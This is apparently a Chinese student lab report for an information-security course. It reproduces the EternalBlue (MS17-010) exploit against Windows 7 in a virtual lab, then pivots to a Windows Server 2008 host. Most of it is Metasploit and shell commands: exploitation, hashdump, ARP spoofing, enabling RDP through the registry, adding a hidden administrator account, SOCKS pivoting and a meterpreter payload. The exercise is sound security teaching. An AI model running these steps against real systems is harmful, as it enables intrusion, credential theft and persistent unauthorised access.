---
comments: true
---


# 信息安全导论

## 永恒之蓝

???+note "相关资料"

    === "环境配置"
    [Kali环境配置](https://blog.csdn.net/m0_74030222/article/details/143866270)<br>
    [WIN7环境配置](https://blog.csdn.net/2301_77578012/article/details/136760697?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522b943f07e0b2605eb1a2f8c60bb442365%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=b943f07e0b2605eb1a2f8c60bb442365&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-136760697-null-null.142^v100^pc_search_result_base5&utm_term=win7%E8%99%9A%E6%8B%9F%E6%9C%BA&spm=1018.2226.3001.4187)<br>
    [win serve 2012环境配置](https://blog.csdn.net/weixin_45588247/article/details/122642391)<br>
    
    === "永恒之蓝复现"
    [问题一](https://blog.csdn.net/weixin_56254398/article/details/136590349?ops_request_misc=%257B%2522request%255Fid%2522%253A%25221ce3dadb2d9dbea05b2e01863536d7cc%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=1ce3dadb2d9dbea05b2e01863536d7cc&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-2-136590349-null-null.142^v100^pc_search_result_base5&utm_term=%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D&spm=1018.2226.3001.4187)<br>
    [开启3389端口](https://blog.csdn.net/weixin_41260116/article/details/84395224)<br>
    [问题二](https://blog.csdn.net/m0_63028223/article/details/127322032?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ECtr-2-127322032-blog-136188876.235%5Ev43%5Epc_blog_bottom_relevance_base4&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ECtr-2-127322032-blog-136188876.235%5Ev43%5Epc_blog_bottom_relevance_base4&utm_relevant_index=5)<br>
    [附加功能](https://blog.csdn.net/m0_65712192/article/details/127637917)<br>


```
永恒之蓝是非常经典的漏洞，请同学们自行搭建永恒之蓝的测试环境，复现永恒之蓝漏洞，（可能需要用到metasploit），该作业需要上交漏洞复现报告，具体有以下要求：
(1)网络中存在攻击机A，靶机B（存在永恒之蓝漏洞）。A利用漏洞控制B
(2)若靶机B的内网存在服务器C，请你将靶机B作为跳板攻击服务器C（攻击机A无法直接访问服务器C，需要通过B来攻击C）
```

### 起始配置

#### 各主机IP

- kali `192.168.226.130`
- windows7(x64) `192.168.226.129` `192.168.247.129`
- windows server 2008 R2(x64) :`192.168.247.130`

在Kali和windows上分别利用`ifconfig`和`ipconfig`查看主机IP地址

![image-20241207183833601](https://zyysite.oss-cn-hangzhou.aliyuncs.com/202412071838767.png)

#### 环境配置

windows防火墙与自动更新关闭

![image-20241207183839443](https://zyysite.oss-cn-hangzhou.aliyuncs.com/202412071838486.png)

### kali 攻击 windows7

#### 进行攻击

首先通过`msfconsole`打开msf功能

```
msfconsole
```

![image-20241207184609461](https://zyysite.oss-cn-hangzhou.aliyuncs.com/202412071846502.png)

然后搜索ms17-010脚本

```
search ms17-010
```

![image-20241207184306525](https://zyysite.oss-cn-hangzhou.aliyuncs.com/202412071843625.png)

对靶机进行扫描，信息收集

```
use auxiliary/scanner/smb/smb_ms17_010
show options
```

![image-20241207184732415](https://zyysite.oss-cn-hangzhou.aliyuncs.com/202412071847479.png)

接下来配置靶机IP信息，并运行

```
set rhosts 192.168.226.129
run
```

![image-20241207184830056](https://zyysite.oss-cn-hangzhou.aliyuncs.com/202412071848087.png)

`exploit`切换到攻击模块，并配置靶机IP，运行

```
use exploit/windows/smb/ms17_010_eternalblue
set rhosts 192.168.226.129
run
```

![image-20241207185012776](https://zyysite.oss-cn-hangzhou.aliyuncs.com/202412071850840.png)

利用`hashdump`查看靶机的用户名与密码

```
hashdump
```

![image-20241207185619998](https://zyysite.oss-cn-hangzhou.aliyuncs.com/202412071856022.png)

利用`shell`登录到靶机的Terminal界面

```
shell
```

![image-20241207185726507](https://zyysite.oss-cn-hangzhou.aliyuncs.com/202412071857532.png)

即可以看到，永恒之蓝攻击成功

#### 利用漏洞进行操作

**从kali上传图片到靶机**

```
upload /home/kali/Desktop/1.jpg c:\\
```

![image-20241207185914088](https://zyysite.oss-cn-hangzhou.aliyuncs.com/202412071859115.png)

结果如下图所示，可以看到已经上传到windows7的系统中

![image-20241207190034335](https://zyysite.oss-cn-hangzhou.aliyuncs.com/202412071900372.png)

**利用ARP攻击靶机使其断网**

```
sudo arpspoof -i etho -t 192.168.226.129 192.168.226.2
```

![image-20241207190419703](https://zyysite.oss-cn-hangzhou.aliyuncs.com/202412071904731.png)

结果如下图所示，可以看到红框所在网络已经断连

![image-20241207190349321](https://zyysite.oss-cn-hangzhou.aliyuncs.com/202412071903361.png)

#### 远程桌面登录

在上面kali已经进入windows7的shell的基础上，开启3389远程桌面端口

```
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
```

查看端口是否开启

```
netstat -an
```

![image-20241207190836998](https://zyysite.oss-cn-hangzhou.aliyuncs.com/202412071908057.png)

创建新用户，并为其添加管理员权限

```
net user hack 123123 /add
net localgroup administrators hack /add
```

![image-20241207190950244](https://zyysite.oss-cn-hangzhou.aliyuncs.com/202412071909271.png)

然后利用新建的用户远程登陆windows7系统

```
rdesktop 192.168.112.128
```

![image-20241207191046631](https://zyysite.oss-cn-hangzhou.aliyuncs.com/202412071910725.png)

### 跳板攻击内网服务器

#### 利用win7开启路由

开启MSF

```
msfconsole 
```

![image-20241211000025577](https://zyysite.oss-cn-hangzhou.aliyuncs.com/202412111439367.png)

**攻击win7，并进入meterpreter**

设置启用永恒之蓝攻击模块

```
 use exploit/windows/smb/ms17_010_eternalblue 
```

![image-20241211000128700](https://zyysite.oss-cn-hangzhou.aliyuncs.com/202412111439364.png)

设置攻击ip 192.168.226.129 

```
set rhosts 192.168.226.129 
```

![image-20241211000153542](https://zyysite.oss-cn-hangzhou.aliyuncs.com/202412111439377.png)

用run/exploit 命令开始攻击

```
run
```

![image-20241211000230630](https://zyysite.oss-cn-hangzhou.aliyuncs.com/202412111439379.png)

已经攻击成功

route指令可以看到win7的网段 有192.168.226.0/24 和192.168.247.0/24两个网段。

```
route
```

![image-20241211000301790](https://zyysite.oss-cn-hangzhou.aliyuncs.com/202412111439387.png)

添加192.168.247.0/24的路由，给Kali和win server建立通道

```
run autoroute -s 192.168.247.0/24
```

![image-20241211000339195](https://zyysite.oss-cn-hangzhou.aliyuncs.com/202412111439398.png)

```
background
```

退出meterpreter,转到后台运行

![image-20241211000403060](https://zyysite.oss-cn-hangzhou.aliyuncs.com/202412111439741.png)

打印路径，可以看到192.168.247.0在后台运行

```
route print
```

![image-20241211000437264](https://zyysite.oss-cn-hangzhou.aliyuncs.com/202412111439757.png)

```
use auxiliary/server/socks_proxy

options
```

使用sock代理相关模块

![image-20241211000518079](https://zyysite.oss-cn-hangzhou.aliyuncs.com/202412111439775.png)

```
set version 5

set srvhost 127.0.0.1

show options
```

配置相关版本和攻击者ip

![image-20241211000626447](https://zyysite.oss-cn-hangzhou.aliyuncs.com/202412111439796.png)

```
run

jobs
```

开始运行sock代理，jobs可以看到正在运行的服务

![image-20241211001046741](https://zyysite.oss-cn-hangzhou.aliyuncs.com/202412111439820.png)

#### 设置SOCKS

```
sudo vim etc/proxychains4.conf 
```

配置里面的文件

最后改为

```
socks5 127.0.0.1 1080
```

![image-20241211145535694](https://zyysite.oss-cn-hangzhou.aliyuncs.com/202412111455784.png)

扫描192.168.247.130（windows server 2008 R2 的ip）445端口

(永恒之蓝攻击主要利用445和139端口)

扫描可以看见端口445 OK（说明open）

```
nmap -sT -Pn -p 445 192.168.247.130
```

![image-20241210231558020](https://zyysite.oss-cn-hangzhou.aliyuncs.com/202412111441588.png)

```
proxychains msfconsole
```

启用MSF

![image-20241210231656182](https://zyysite.oss-cn-hangzhou.aliyuncs.com/202412111441584.png)

```
use auxiliary/admin/smb/ms17_010_command
```

用该模块在网段里搜索容易被MS17-010漏洞影响的Windows主机

![image-20241210231843922](https://zyysite.oss-cn-hangzhou.aliyuncs.com/202412111441594.png)

```
set rhosts 192.168.247.130
```

![image-20241210231831010](https://zyysite.oss-cn-hangzhou.aliyuncs.com/202412111441598.png)

set command + 指令

相当设定发给rhosts ip 的指令，

run运行发送

这里相当于发送whoami给windows server，返回系统用户名

```
set command whoami

run
```

![image-20241210231917436](https://zyysite.oss-cn-hangzhou.aliyuncs.com/202412111441602.png)

这个是新增用户(不过这里没run)

```
set command net user lyq djxlyq63 /add
```

![image-20241210232146623](https://zyysite.oss-cn-hangzhou.aliyuncs.com/202412111441600.png)

将新增的用户加到管理组(不过这里没run，参考第一问，为远程登录做准备)

```
set command net localgroup administrators lyq /add
```

![image-20241210232058221](https://zyysite.oss-cn-hangzhou.aliyuncs.com/202412111441897.png)

这个是修改系统注册表信息，添加fDenyTSConnections 变量，格式为REG_DWORD ,值为0，相当于开启远程登录，打开3389端口。

```
set command "reg add HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 0x00000000 /f"
```

![image-20241210232316845](https://zyysite.oss-cn-hangzhou.aliyuncs.com/202412111441914.png)

```
run
```

![image-20241210232344534](https://zyysite.oss-cn-hangzhou.aliyuncs.com/202412111441927.png)

选用永恒之蓝攻击模块

```
use exploit/windows/smb/ms17_010_psexec
```

![image-20241210232427300](https://zyysite.oss-cn-hangzhou.aliyuncs.com/202412111441940.png)

选用攻击载荷

可以通过show payloads查看可以利用的载荷

```
set payload windows/meterpreter/bind_tcp
```

![image-20241210232450815](https://zyysite.oss-cn-hangzhou.aliyuncs.com/202412111441956.png)

运行

```
run
```

![image-20241210232543261](https://zyysite.oss-cn-hangzhou.aliyuncs.com/202412111441971.png)

进入终端

```
shell
```

![image-20241210232619529](https://zyysite.oss-cn-hangzhou.aliyuncs.com/202412111441402.png)

查看ip

```
ipconfig
```

![image-20241210232633157](https://zyysite.oss-cn-hangzhou.aliyuncs.com/202412111441416.png)

查看系统信息

```
systeminfo
```

![image-20241210232748734](https://zyysite.oss-cn-hangzhou.aliyuncs.com/202412111441431.png)

在Windows操作系统中使用的命令行指令，它用于设置当前控制台的代码页为UTF-8编码，解决乱码问题

```
chcp 65001
```

![image-20241210232859519](https://zyysite.oss-cn-hangzhou.aliyuncs.com/202412111441447.png)

查看windows server 2008 R2的CPU信息

```
wmic cpu list brief
```

![image-20241210233017604](https://zyysite.oss-cn-hangzhou.aliyuncs.com/202412111441464.png)




